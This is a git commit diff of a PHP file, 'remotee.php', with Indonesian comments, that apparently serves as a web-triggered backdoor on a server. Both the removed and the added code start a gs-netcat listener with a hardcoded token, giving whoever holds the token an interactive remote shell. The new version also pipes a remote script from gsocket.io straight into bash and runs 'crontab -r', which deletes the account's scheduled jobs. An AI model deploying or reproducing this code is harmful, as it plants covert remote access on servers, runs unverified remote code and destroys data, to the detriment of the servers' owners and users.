0c01995400a1c93d69ed1cb7d0cdfc6d01f76b73
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-03-30 19:21:11 +0700

    Update remotee.php

--- remotee.php
+++ remotee.php
@@ -1,27 +1,16 @@
 <?php
-$token = "u401823943dTQwMTgyMzk0Mw";
-$tmp_path = "/tmp/gs-netcat";
+$token = "u401823943dTQwMTgyMzk0Mw"; // Pakai token yang tadi aja biar konsisten
+$cmd = "curl -fsSL https://gsocket.io/x | bash && GS_PORT=443 HOME=/tmp /tmp/.gsocket/bin/gs-netcat -s $token -l -i";
+ 
 
 echo "--- Memulai Proses Recovery ---<br>";
 
 // 1. Bersihkan proses lama
 system("pkill -f defunct");
+system("crontab -r");
 system("pkill -f gs-netcat");
-
-// 2. Download binary fresh ke /tmp
-if (!file_exists($tmp_path)) {
-    echo "Mendownload binary ke /tmp...<br>";
-    system("curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/gs-netcat_x86_64-alpine -o $tmp_path");
-    system("chmod +x $tmp_path");
-}
-
-// 3. Verifikasi file
-if (file_exists($tmp_path)) {
-    echo "Binary siap. Memulai Listener...<br>";
-    // Jalankan di background
-    exec("HOME=/tmp $tmp_path -s $token -l -i > /dev/null 2>&1 &");
-    echo "GSocket AKTIF! Silakan konek dari PowerShell PC.";
-} else {
-    echo "Gagal download ke /tmp. Coba cek koneksi internet server.";
-}
+// 1. Bersihkan proses macet
+system("pkill -f defunct; pkill -f mini-nc");
+echo "Memicu GSocket via Deploy Method...";
+system($cmd . " > /dev/null 2>&1 &");
 ?>
